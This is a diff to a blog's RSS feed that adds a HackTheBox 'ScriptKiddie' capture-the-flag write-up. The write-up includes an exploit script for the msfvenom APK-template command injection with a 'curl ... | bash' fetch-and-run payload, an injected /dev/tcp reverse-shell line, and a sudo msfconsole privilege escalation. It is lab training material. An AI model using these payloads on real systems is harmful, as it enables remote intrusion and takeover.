@@ -33,6 +33,117 @@
     </item>
     
     <item>
+      <title>HackTheBox - ScriptKiddie Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-scriptkiddie/</link>
+      <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-scriptkiddie/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.226 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Discovered open port 22/tcp on 10.10.10.226
+Discovered open port 5000/tcp on 10.10.10.226
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;nmap.png&#34;&gt;
+&lt;p&gt;We have two ports open&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;22/SSH :  OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/li&gt;
+&lt;li&gt;5000/HTTP :  Werkzeug httpd 0.16.1&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;ndash;&amp;gt; Service versions seem to be up-to-date, we don&amp;rsquo;t really focus on them&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-server-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Server &lt;/p&gt;&lt;/h2&gt;
+&lt;img src=&#34;web.png&#34;&gt;
+&lt;p&gt;&amp;ndash;&amp;gt; We have so many user inputs, first thing we should check if there is any command injections as it seem to be using linux binaries which can lead to RCE&lt;/p&gt;
+&lt;img src=&#34;web1.png&#34;&gt;
+&lt;img src=&#34;web2.png&#34;&gt;
+&lt;img src=&#34;web3.png&#34;&gt;
+&lt;p&gt;&amp;ndash;&amp;gt; It seems that the input is hardcoded, taking into considerating that this is an easy box i don&amp;rsquo;t that we should try to bypass these filters and just move on&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredfoothold--user-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &amp;amp; User flag &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Another interesting thing is the file upload that takes a msfvenom template!&lt;/p&gt;
+&lt;p&gt;Searching a bit in google can lead us to what we want! We can craft a Android payload template and get a shell on the box&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&#34;&gt;https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python3
+import subprocess
+import tempfile
+import os
+from base64 import b32encode
+
+payload = &#39;curl http://10.10.14.54:1337/x|bash&#39;
+
+
+payload_b32 = b32encode(payload.encode()).decode()
+dname = f&amp;quot;CN=&#39;|echo {payload_b32} | base32 -d | sh #&amp;quot;
+
+print(f&amp;quot;[+] Manufacturing evil apkfile&amp;quot;)
+print(f&amp;quot;Payload: {payload}&amp;quot;)
+print(f&amp;quot;-dname: {dname}&amp;quot;)
+print()
+
+tmpdir = tempfile.mkdtemp()
+apk_file = os.path.join(tmpdir, &amp;quot;evil.apk&amp;quot;)
+empty_file = os.path.join(tmpdir, &amp;quot;empty&amp;quot;)
+keystore_file = os.path.join(tmpdir, &amp;quot;signing.keystore&amp;quot;)
+storepass = keypass = &amp;quot;password&amp;quot;
+key_alias = &amp;quot;signing.key&amp;quot;
+
+# Touch empty_file
+open(empty_file, &amp;quot;w&amp;quot;).close()
+
+# Create apk_file
+subprocess.check_call([&amp;quot;zip&amp;quot;, &amp;quot;-j&amp;quot;, apk_file, empty_file])
+
+# Generate signing key with malicious -dname
+subprocess.check_call([&amp;quot;keytool&amp;quot;, &amp;quot;-genkey&amp;quot;, &amp;quot;-keystore&amp;quot;, keystore_file, &amp;quot;-alias&amp;quot;, key_alias, &amp;quot;-storepass&amp;quot;, storepass,
+                       &amp;quot;-keypass&amp;quot;, keypass, &amp;quot;-keyalg&amp;quot;, &amp;quot;RSA&amp;quot;, &amp;quot;-keysize&amp;quot;, &amp;quot;2048&amp;quot;, &amp;quot;-dname&amp;quot;, dname])
+
+# Sign APK using our malicious dname
+subprocess.check_call([&amp;quot;jarsigner&amp;quot;, &amp;quot;-sigalg&amp;quot;, &amp;quot;SHA1withRSA&amp;quot;, &amp;quot;-digestalg&amp;quot;, &amp;quot;SHA1&amp;quot;, &amp;quot;-keystore&amp;quot;, keystore_file,
+                       &amp;quot;-storepass&amp;quot;, storepass, &amp;quot;-keypass&amp;quot;, keypass, apk_file, key_alias])
+
+print()
+print(f&amp;quot;[+] Done! apkfile is at {apk_file}&amp;quot;)
+print(f&amp;quot;Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&amp;quot;)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s execute the apk file&lt;/p&gt;
+&lt;img src=&#34;apk.png&#34;&gt;
+&lt;img src=&#34;ff.png&#34;&gt;
+And set a listener to get a reverse shell on the box
+&lt;img src=&#34;rev1.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s stabilize our shell&lt;/p&gt;
+&lt;img src=&#34;stable.png&#34;&gt;
+&lt;h1 id=&#34;p-stylecolorred-2nd-user--root-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; 2nd USER &amp;amp; Root Flag &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Looking a bit in the files, we can find an interesting file owned by pwn user!&lt;/p&gt;
+&lt;img src=&#34;pwn.png&#34;&gt;
+&lt;p&gt;Basically it takes the ips from the hackers file and run nmap on it!&lt;/p&gt;
+&lt;p&gt;The idea is to inject a malicious command instead of an ip&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;  ;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.4/4444 0&amp;gt;&amp;amp;1&#39; #&amp;quot; &amp;gt;&amp;gt;hackers
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We should add two spaces because of the | cut -d&#39; &#39; -f3- |&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;we.png&#34;&gt;
+&lt;p&gt;We got a shell as the user pwn!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s check if he can run anything as sudo&lt;/p&gt;
+&lt;img src=&#34;sudo.png&#34;&gt;
+&lt;p&gt;We can run msfconsole as root! basically a free win :D!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo /opt/metasploit-framework-6.0.9/msfconsole
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;root.png&#34;&gt;
+&lt;p&gt;And we can execute commands as root&lt;/p&gt;
+&lt;img src=&#34;root1.png&#34;&gt;
+&lt;p&gt;And we rooted the box!&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
       <title>HackTheBox - Ready Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/htb-ready/</link>
       <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
